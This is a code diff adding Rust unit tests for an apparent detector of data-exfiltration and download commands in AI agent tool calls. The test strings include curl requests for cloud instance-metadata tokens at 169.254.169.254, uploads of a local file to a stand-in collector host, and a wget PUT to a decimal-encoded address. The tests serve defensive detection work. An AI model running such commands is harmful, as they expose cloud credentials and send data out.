@@ -1128,6 +1128,90 @@ fn literal_loopback_downloads_do_not_seed_native_execution_chains() {
 }
 
 #[test]
+fn imds_token_request_is_not_a_native_upload() {
+    let url = "http://169.254.169.254/latest/api/token";
+    let ttl = "'X-aws-ec2-metadata-token-ttl-seconds: 60'";
+    let other = "https://collector.example.invalid/upload";
+    let lookup = "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/placement/region";
+    let token = format!("TOKEN=$(curl -s -X PUT -H {ttl} {url})");
+    for (command, download, upload) in [
+        // The exclusion reads each native stage, which keeps its whitespace.
+        (format!("curl -X PUT -H {ttl} {url}"), false, false),
+        (format!("curl -sS -XPUT {url} -H {ttl}"), false, false),
+        (token.clone(), false, false),
+        (format!("{token}; {lookup}"), true, false),
+        (
+            format!("echo start; curl -X PUT -H {ttl} {url}"),
+            false,
+            false,
+        ),
+        (
+            format!("wget -qO- --method=PUT --header={ttl} {url}"),
+            false,
+            false,
+        ),
+        // Anything beyond the bodyless request stays an upload.
+        (
+            format!("curl -X PUT -d @report.txt -H {ttl} {url}"),
+            false,
+            true,
+        ),
+        (
+            format!("curl -X PUT -T report.txt -H {ttl} {url}"),
+            false,
+            true,
+        ),
+        (format!("curl -X PUT -H {ttl} {url} {other}"), false, true),
+        (
+            format!("curl -X PUT -H {ttl} https://collector.example.invalid/latest/api/token"),
+            false,
+            true,
+        ),
+        (
+            format!("curl -X PUT -H {ttl} http://169.254.169.254/latest/meta-data/x"),
+            false,
+            true,
+        ),
+        (format!("curl -X POST -H {ttl} {url}"), false, true),
+        (
+            format!("{token}; curl --data @report.txt {other}"),
+            false,
+            true,
+        ),
+        (
+            format!("{token} & curl -d @report.txt {other}"),
+            false,
+            true,
+        ),
+        (format!("curl -X PUT {other}"), false, true),
+    ] {
+        let output = actions(&[tool("imds", &command, Some("2026-09-17T00:00:00Z"))]);
+        let findings = output.sessions()[0].action_findings();
+        let matches = |rule: &str| {
+            findings
+                .iter()
+                .any(|finding| finding.rule_ids().iter().any(|id| id == rule))
+        };
+        assert_eq!(matches("network.download"), download, "{command}");
+        assert_eq!(matches("exfil.outbound_upload"), upload, "{command}");
+    }
+}
+
+#[test]
+fn wget_flags_that_take_no_value_keep_a_native_upload() {
+    let command = "wget --method=PUT -m 3405803786";
+    let output = actions(&[tool("imds", command, Some("2026-09-17T00:00:00Z"))]);
+    let findings = output.sessions()[0].action_findings();
+    assert!(
+        findings.iter().any(|finding| finding
+            .rule_ids()
+            .iter()
+            .any(|id| id == "exfil.outbound_upload")),
+        "{command}"
+    );
+}
+
+#[test]
 fn skipped_encoded_members_keep_their_argument_roles() {
     // 70 edits exceed the per-value array bound, so the encoded `edits` member is
     // skipped during admission. It must still route like admitted edits: only
